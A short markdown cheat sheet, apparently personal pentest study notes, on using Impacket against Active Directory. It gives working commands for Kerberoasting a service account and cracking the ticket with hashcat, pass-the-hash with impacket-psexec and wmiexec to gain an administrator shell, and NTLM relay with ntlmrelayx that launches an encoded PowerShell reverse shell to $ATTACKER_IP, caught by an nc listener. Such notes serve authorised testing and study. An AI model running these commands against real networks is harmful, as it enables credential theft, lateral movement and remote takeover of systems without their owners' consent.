# Impacket 

Note: This doc should be placed in an eventual AD folder, once I get that far.
## Install

install impacket with:
`pipenv install impacket`
this will create a virtualenv in `/home/${local_user}/.local/share/virtualenvs/${VENV_NAME}`
you can then:
```
export IMPACKET_SCRIPTS=$(pipenv --venv)/bin
```
Now, you can run impacket scripts with:
```
python3  ${IMPACKET_SCRIPTS}/${script} ...
```

## Kerberoasting

check for SPN accounts:
```
python3 ${IMPACKET_SCRIPTS}/GetUserSPNs.py -dc-ip ${DC_IP} ${DOMAIN}/${DOMAIN_USER}:${DOMAIN_USER_PASSWORD} 

```
Now, we can request the TGS for the found user:

```
python3 $IMPACKET_SCRIPTS/GetUserSPNs.py -dc-ip ${DC_IP} ${DOMAIN}/${DOMAIN_USER}:${DOMAIN_USER_PW} -request-user ${SPN_ACCOUNT} -outputfile tgs.txt 


```

Now, you can crack the password in the tgs file:

```
hashcat -a 0 -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```


## Pass Admin hash psexec

Assuming you've found an NTLM admin hash, you might be able to get a reverse shell onto another machine with `impacket-psexec`:

```
impacket-psexec -hashes 00000000000000000000000000000000:${NTLM_HASH} Administrator@$RHOST
```
Format is `${LM_HASH}:${NT_HASH}` - when using the NTLM hash, just put `32 * 0` in the `LM_HASH` section.

a similar command is `impacket-wmiexec`, which gets us a shell as Administrator, rather than the SYSTEM.


## Relay hash with impacket-ntlmrelayx

You can relay SMB requests between SRV1 and SRV2 by doing the following:

* Setup an nc listener on kali: `nc -nvlp 6666`.
* From kali: `sudo impacket-ntlmrelayx --no-http-server -smb2support -t ${SRV2} -c "powershell -enc ${ENCODED_REV_SHELL}` (`ENCODED_REV_SHELL` points to `$ATTACKER_IP` and port `6666`)
* From SRV1 do `dir \\$ATTACKER_IP\thiswillgetdenied`.
The SMB request with the NTLMv2 Hash of the user on SRV1 will get relayed to SRV2.
Target system needs to have UAC remote restrictions disabled, and the user on SRV1 needs to have access to SRV2 for this to work.


